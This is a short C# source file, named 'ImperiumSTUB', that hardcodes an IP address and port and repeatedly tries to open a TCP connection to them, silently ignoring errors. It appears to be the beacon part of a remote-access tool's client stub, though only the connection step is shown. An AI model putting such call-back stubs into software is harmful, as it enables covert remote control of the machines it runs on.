using System;
using System.Net;
using System.Net.Sockets;

namespace ImperiumSTUB
{
    class Program
    {
        static void Main(string[] args)
        {
            Variables.TCPClient = new TcpClient();
            Variables.Port = 52716;
            Variables.ConnectTo = "192.168.58.1";
            bool IsIPAddress = IPAddress.TryParse(Variables.ConnectTo, out Variables.IPAddress);
            switch (IsIPAddress)
            {
                case true:
                    Variables.IPAddress = IPAddress.Parse(Variables.ConnectTo);
                    break;
                case false:
                   Variables.IPAddress = Dns.GetHostAddresses(Variables.ConnectTo)[0];
                    break;
            }
            try
            {
                do
                {
                    Variables.TCPClient.Connect((Variables.IPAddress), Variables.Port);
                } while (!Variables.TCPClient.Connected);
            }
            catch (Exception)
            {
            }
        }
    }
}
